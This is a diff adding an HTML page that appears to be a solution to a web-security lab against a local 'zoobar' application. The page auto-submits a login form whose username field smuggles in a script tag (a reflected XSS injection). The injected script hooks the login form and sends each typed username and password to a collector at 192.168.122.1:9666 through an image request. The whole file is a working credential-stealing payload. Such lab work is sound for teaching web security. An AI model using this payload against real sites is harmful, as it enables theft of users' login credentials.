@@ -1,0 +1,35 @@
+<html>
+    <body>
+        <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+            <input id="username" type="hidden" name="login_username" value="">
+            <input type="hidden" name="login_password" value="">
+        </form>
+
+        <script>
+         function addValidator() {
+             window.onload = () => {
+                 document.loginform.onsubmit = () => {
+                     return new Promise((resolve, reject) => {
+                         const user = document.loginform['login_username'].value;
+                         const pass = document.loginform['login_password'].value;
+                         const image = new Image();
+
+                         image.onload = resolve;
+
+                         image.src = 'http://192.168.122.1:9666/?'
+                                   + 'user=' + encodeURIComponent(user)
+                                   + '&pass=' + encodeURIComponent(pass)
+                                   + '&random=' + Math.random();
+                     }).then(true);
+                 }
+             }
+         }
+
+         document.getElementById('username').value = '"><scri' + 'pt>'
+                                                   + addValidator.toString()
+                                                   + 'addValidator();</scri'
+                                                   + 'pt><input type="hidden" name="login_token" value="';
+         document.loginform.submit();
+        </script>
+    </body>
+</html>
